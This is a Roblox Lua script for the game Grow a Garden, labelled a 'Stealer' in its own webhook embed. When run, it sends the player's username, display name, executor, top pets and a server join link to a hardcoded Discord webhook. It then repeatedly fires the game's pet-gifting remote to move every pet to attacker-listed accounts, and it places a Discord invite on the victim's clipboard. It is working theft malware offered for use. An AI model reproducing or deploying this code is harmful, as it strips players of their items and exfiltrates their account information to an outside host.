 
Username = {"qasim_20133,powerplus112,textboy1230"} -- receiver usernames 
Webhook = "https://discord.com/api/webhooks/1396545878533345452/IRBB-RSAgF9LKIP39qRwMENg0RL5k2tExAxKLkfpTj0DxJiJjNsZgCM6PVxZgyPjkWhv" -- your webhook UR

local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local back = LocalPlayer.Backpack

local good_pet = {"Dragonfly", "Mimic Octopus", "Butterfly", "Queen Bee", "Disco Bee", "Raccoon", "Red Fox", "Fennec Fox", "Chicken Zombie", "T-Rex", "Kitsune", "Spinosaurus"}
local pets = {}

-- unequip any held tools
local function unequip()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Tool") then
            item.Parent = back
        end
    end
end

-- calculate value of an item
local function value(a)
    if a:GetAttribute("PET_UUID") and a:GetAttribute("ItemType") == "Pet" then
        local ok, val = pcall(function()
            local pr = require(RS.Data.PetRegistry)
            local data = require(RS.Modules.DataService):GetData().PetsData.PetInventory.Data[a:GetAttribute("PET_UUID")]
            local egg = data.PetData.HatchedFrom
            local levelMult = require(RS.Modules.PetServices.PetUtilities):GetLevelProgress(data.PetData.Level)
            local range = pr.PetEggs[egg].RarityData.Items[data.PetType].GeneratedPetData.WeightRange
            local weightMult = require(RS.Modules.NumberUtil).ReverseLerp(range[1], range[2], data.PetData.BaseWeight)
            return math.floor(pr.PetList[data.PetType].SellPrice * (math.lerp(0.8, 1.2, weightMult) * math.lerp(0.15, 6, levelMult)))
        end)
        return type(val) == "number" and val or 0
    else
        return 0
    end
end

-- gather inventory (pets only)
local function getinv()
    unequip()
    pets = {}
    for _, v in pairs(back:GetChildren()) do
        if v:GetAttribute("PET_UUID") and v:GetAttribute("ItemType") == "Pet" then
            table.insert(pets, {value=value(v), name=v.Name, uid=v:GetAttribute("PET_UUID"), tool=v})
        end
    end
    table.sort(pets, function(a,b)
        local a_good = table.find(good_pet, a.name) and 1 or 0
        local b_good = table.find(good_pet, b.name) and 1 or 0
        if a_good ~= b_good then return a_good > b_good end
        return a.value > b.value
    end)
end

-- detect rare pets
local function hasRarePets()
    for _, p in pairs(pets) do
        if table.find(good_pet, p.name) then
            return true
        end
    end
    return false
end

-- number formatter
local function formatNumber(n)
    local numbers = math.floor(n)
    local suffixes = {"", "k", "m", "b", "t","qd", "sn", "sx", "sp", "oc", "no"}
    local suffixIndex = 1
    while numbers >= 1000 do
        numbers = numbers / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", numbers, suffixes[suffixIndex])
end

-- send webhook (pets only)
local function send(url)
    local petSection = (#pets > 0) and '\n``Top 10 best pets:``\n```'..
        table.concat((function()
            local t = {}
            for i, v in ipairs(pets) do
                if i > 10 then break end
                table.insert(t, v.name .. " value: " .. formatNumber(v.value))
            end
            return t
        end)(), "\n")..'```' or ""

    local body = HttpService:JSONEncode({
        ["username"] = LocalPlayer.Name,
        ["avatar_url"] = "https://i.ibb.co/CZ5HcN9/Chat-GPT-Image-Aug-21-2025-12-56-12-PM.png",
        ["content"] = (hasRarePets() and "@everyone\n" or "") .. 
            'game:GetService("TeleportService"):TeleportToPlaceInstance("'..game.PlaceId..'", "'..game.JobId..'", game.Players.LocalPlayer)',
        ["embeds"] = {{
            ["title"] = "Grow a Garden Stealer by formal scripts",
            ["color"] = 32767,
            ["fields"] = {
                {
                    ["name"] = "`Player Info:`",
                    ["value"] = "```Username: " .. LocalPlayer.Name ..
                        "\nDisplay Username: " .. LocalPlayer.DisplayName .. 
                        "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
                        "\nRoblox version: "..version().."\nReceiver: "..table.concat(Username, ", ").."```",
                    ["inline"] = false
                },
                {
                    ["name"] = "**__Inventory__**",
                    ["value"] = '```Total pets: '.. #pets..'```'..petSection,
                    ["inline"] = false
                },
                {
                    ["name"] = "__Join link:__",
                    ["value"] = "[click here to join](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId..")",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "best Stealer - "..os.date("%Y-%m-%d %H:%M:%S")
            }
        }}
    })

    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
end

-- gifting function (pets only)
local function giftPet(tool, receiverPlr)
    if not receiverPlr or not tool then return false end
    LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
    task.wait(0.4)
    RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
    task.wait(0.4)
    return true
end

-- gifting loop until no pets left
local function start(receiverName)
    local receiverPlr = Players:FindFirstChild(receiverName)
    if not receiverPlr then return end

    while true do
        getinv()
        if #pets == 0 then break end
        for _, p in ipairs(pets) do
            giftPet(p.tool, receiverPlr)
            task.wait(0.3)
        end
        task.wait(0.5)
    end
end

-- run
getinv()
send(Webhook)
setclipboard("discord.gg/Y2fwV2eF2Z")

-- auto-start if receiver is already here
for _, plr in pairs(Players:GetPlayers()) do
    if table.find(Username, plr.Name) then
        start(plr.Name)
    end
end

-- still listen for new players
Players.PlayerAdded:Connect(function(player)
    if table.find(Username, player.Name) then
        start(player.Name)
    end
end)
